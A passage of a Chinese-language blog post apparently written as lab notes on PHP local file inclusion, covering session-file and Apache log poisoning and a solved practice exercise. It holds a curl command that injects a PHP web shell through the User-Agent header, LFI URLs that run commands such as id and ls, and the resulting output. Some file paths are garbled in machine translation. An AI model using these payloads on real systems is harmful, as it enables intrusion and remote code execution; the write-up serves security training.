+<pre><code>2f40d853e2d4768d87da1c81772bae0a.txt bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var 
+</code></pre>
+<p>读取这个txt文件即可</p>
+<h2 id="PHP-Session-Poisoning"><a href="#PHP-Session-Poisoning" class="headerlink" title="PHP Session Poisoning"></a>PHP Session Poisoning</h2><p>大多数PHP web应用程序都使用PHPSSID cookie，它可以在后端保存特定的用户相关数据，因此web应用程序可以通过其cookie跟踪用户的详细信息。这些详细信息存储在后端的会话文件中，并保存在Linux上的<code>/var/lib/php/sessions/</code>和Windows上的<code>C:\Windows\Temp\</code>中。包含用户数据的文件的名称与带有sess_前缀的PHPSSID cookie的名称相匹配。例如，如果PHPSESSID cookie设置为el4ukv0kqbvoirg7nkp4dncpk3，则其在磁盘上的位置将为<code>/var/lib/php/sessions/sese_el4ukv0kqcbvoirg 7nkp4DNcpk3</code>。<br>在PHP会话中毒攻击中，我们需要做的第一件事是检查我们的PHPSSID会话文件，看看它是否包含我们可以控制和中毒的任何数据。因此，让我们首先检查我们的会话是否设置了PHPSESSID cookie：</p>
+<p>如果我们的PHPSSID cookie值是<code>nhhv8i0o6ua4g88bkdl9u1fdsd</code>，因此它应该存储在<code>/var/lib/php/sessions/sses_nhhv8i0o 6ua4g88 bkdl9U1fdsd</code>中。</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+</code></pre>
+<p>注意：要执行另一个命令，会话文件必须再次被web shell破坏，因为在我们上次包含之后，它会被&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sses_nhhv8i0o6ua4g88bkdl9u1fdsd覆盖。理想情况下，我们会使用中毒的web shell向web目录写入一个永久的web shell，或者发送一个反向shell以便于交互。</p>
+<h2 id="Server-Log-Poisoning"><a href="#Server-Log-Poisoning" class="headerlink" title="Server Log Poisoning"></a>Server Log Poisoning</h2><p>Apache和Nginx都维护各种日志文件，如access.log和error.log。access.log文件包含有关向服务器发出的所有请求的各种信息，包括每个请求的User Agent标头。由于我们可以控制请求中的用户代理标头，因此我们可以像上面所做的那样使用它来破坏服务器日志。<br>一旦中毒，我们需要通过LFI漏洞包括日志，为此我们需要对日志进行读取访问。默认情况下，Nginx日志可由低权限用户读取（例如www数据），而Apache日志只能由具有高权限的用户读取（如root&#x2F;adm组）。但是，在较旧或配置错误的Apache服务器中，这些日志可能由低特权用户读取。<br>默认情况下，Apache日志在Linux上位于<code>/var/log/apache2/</code>，在Windows上位于<code>C:\xampp\apache\logs\</code> ，而Nginx日志在Linux和Windows上分别位于 <code>/var/log/nginx/</code> 和 <code>C:\nginx\log\</code> 。然而，在某些情况下，日志可能位于不同的位置，因此我们可以使用<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlist</a> 来模糊它们的位置。</p>
+<p>提示：日志往往很大，在LFI漏洞中加载日志可能需要一段时间才能加载，甚至在最坏的情况下会导致服务器崩溃。因此，在生产环境中要谨慎高效地使用它们，不要发送不必要的请求。</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log
+</code></pre>
+<p>正如我们所看到的，我们可以阅读日志。该日志包含远程IP地址、请求页面、响应代码和用户代理标头。如前所述，User-Agent标头由我们通过HTTP请求标头控制，因此我们应该能够破坏该值。</p>
+<p>注意：当所有对服务器的请求都被记录下来时，我们可以破坏对web应用程序的任何请求，而不一定像上面所做的那样破坏LFI请求。</p>
+<p>我们也可能通过cURL发送请求来破坏日志，如下所示：</p>
+<pre><code> curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;
+</code></pre>
+<p>由于日志现在应该包含PHP代码，LFI漏洞应该执行此代码，并且我们应该能够获得远程代码执行。我们可以使用（？cmd&#x3D;id）指定要执行的命令：</p>
+<pre><code>提示：User-Agent头也显示在Linux/proc/目录下的进程文件中。因此，我们可以尝试包含/proc/self/environment或/proc/self-fd/N文件（其中N是PID，通常在0-50之间），我们可能能够对这些文件执行相同的攻击。如果我们没有对服务器日志的读取权限，这可能会变得很方便，但是，这些文件也可能只有特权用户才能读取。
+</code></pre>
+<p>最后，我们可以在各种系统日志上使用其他类似的日志中毒技术，这取决于我们可以读取访问哪些日志。以下是我们可能能够阅读的一些服务日志：</p>
+<ul>
+<li><code>/var/log/sshd.log</code></li>
+<li><code>/var/log/mail</code></li>
+<li><code>/var/log/vsftpd.log</code></li>
+</ul>
+<p>我们应该首先尝试通过LFI读取这些日志，如果我们确实可以访问它们，我们可以像上面所做的那样尝试毒害它们。例如，如果ssh或ftp服务向我们公开，并且我们可以通过LFI读取它们的日志，那么我们可以尝试登录它们，并将用户名设置为PHP代码，在包含它们的日志后，PHP代码就会执行。邮件服务也是如此，因为我们可以发送一封包含PHP代码的电子邮件，在包含日志后，PHP代码就会执行。我们可以将此技术推广到任何记录我们控制的参数并且可以读取LFI漏洞的日志。</p>
+<h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><pre><code>Target: 68.183.36.140:32495 
+</code></pre>
+<ul>
+<li>使用本节中涵盖的任何技术来获得RCE，然后提交以下命令的输出：pwd</li>
+<li>尝试使用不同的技术获取RCE并读取&#x2F;</li>
+</ul>
+<p>先看一下服务器，是：</p>
+<pre><code>Apache/2.4.41 (Ubuntu) Server at 68.183.36.140 Port 32495
+</code></pre>
+<p>那么日志文件可能在 <code>/var/log/apache2/</code> 中，尝试读取一下：</p>
+<pre><code>68.183.36.140 - - [17/Jun/2023:02:42:50 +0100] &quot;GET / HTTP/1.1&quot; 200 1429 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43&quot; 68.183.36.140 - -
+</code></pre>
+<p>发现记录了User-Agent，那么我们通过改变User-Agent的值再包含进行注入，但发现一旦注入shell就会无法访问，后来查看了一下论坛发现是注入的时候 cmd 要用单引号而不是双引号，(lll￢ω￢) <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
+<p>此时：</p>
+<pre><code class="url">http://68.183.36.140:30954/index.php?language=/var/log/apache2/access.log&amp;cmd=id
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>language=/var/log/apache2/access.log HTTP/1.1&quot; 200 1471 &quot;-&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data) &quot; 68.183.36
+</code></pre>
+<p>再试试session注入：</p>
+<p>我们找到自己的session然后尝试访问它：（注意在session值前面加上<code>sess_</code>）</p>
+<pre><code class="url">http://68.183.36.140:30954/index.php?language=/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>selected_language|s:53:&quot;/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r&quot;;preference|s:7:&quot;Spanish&quot;; 
+</code></pre>
+<p>我们可以看到，会话文件包含两个值：page，显示所选语言的页面，preference，显示所选择的语言,这应该系统自动选择的，因为我们没有指定过，那看起来我们能控制的只有前半段了，尝试把页面值作为注入语段，即</p>
+<p><code>language=$poisoning</code>,ok,try 一 try：</p>
+<pre><code class="url">http://68.183.36.140:30954/index.php?language=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<p>然后此时如果直接访问<code>/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r</code></p>
+<p>注入的值会被覆盖，所以直接传入参数</p>
+<pre><code>http://68.183.36.140:30954/index.php?language=/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r&amp;cmd=cd%20/;ls
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>selected_language|s:30:&quot;bin boot c85ee5082f4c723ace6c0796e3a3db09.txt dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var &quot;;preference|s:7:&quot;Spanish&quot;;
+</code></pre>
+<p>注意：要执行另一个命令，会话文件必须再次被web shell破坏，因为在我们上次包含之后，它会被&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sses_nhhv8i0o6ua4g88bkdl9u1fdsd覆盖。理想情况下，我们会使用中毒的web shell向web目录写入一个永久的web shell，或者发送一个反向shell以便于交互。</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
